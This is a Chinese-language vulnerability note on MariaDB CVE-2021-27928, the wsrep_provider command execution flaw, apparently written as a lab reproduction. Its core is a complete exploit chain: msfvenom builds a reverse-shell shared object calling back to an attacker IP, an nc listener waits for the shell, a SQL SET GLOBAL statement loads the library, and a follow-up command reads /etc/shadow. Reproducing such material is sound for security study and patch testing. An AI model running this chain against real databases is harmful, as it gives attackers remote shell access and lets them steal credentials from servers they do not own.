# 数据库相关漏洞

## MariaDB CVE-2021-27928

[MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution](https://www.exploit-db.com/exploits/49765)

### 前提
1 有上传文件到该服务器任意路径的权限，如web上传漏洞或功能
2 有mysql账号密码 或 sql注入

```bash
# lab setup
# https://hub.docker.com/_/mariadb
sudo docker pull mariadb:10.5.8
docker run -p 3309:3306  --name mariadb-pt -e MYSQL_ROOT_PASSWORD=552271 -d mariadb:10.5.8

# 查看ip
sudo docker exec -it mariadb-pt bash
ip addr -4

# exploit
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf-so -o CVE-2021-27928.so
nc -lvp 4444
sudo docker cp CVE-2021-27928.so mariadb-pt:/tmp/CVE-2021-27928.so
mysql -h 127.0.0.1 -uroot -p552271 -P3309 -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'
sudo cat /etc/shadow

# affected
1 获得 mariadb 执行用句的shell权限
2 mariadb 会被干掉
```


### 参考：

[PXC快速入门](https://www.cnblogs.com/f-ck-need-u/p/9364877.html)
 wsrep_provider ：指定Galera库的路径
mysql也支持 wsrep_provider  [6. MySQL Galera Cluster全解析 Part 6 Galera Cluster参数设置  tutorial6](http://www.zhaibibei.cn/mysql/galera/tutorial6/)
  但验证，mysql并无此问题

[MariaDB 安全漏洞](https://www.anquanke.com/vul/id/2390681)
 MariaDB是MariaDB（Mariadb）基金会的一套免费开源的数据库管理系统，也是一个采用Maria存储引擎的MySQL分支版本。 
 MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9 
 存在安全漏洞，不受信任的搜索路径会导致eval注入。

[MariaDB Galera Cluster部署实战](https://jeremyxu2010.github.io/2018/02/mariadb-galera-cluster%E9%83%A8%E7%BD%B2%E5%AE%9E%E6%88%98/)
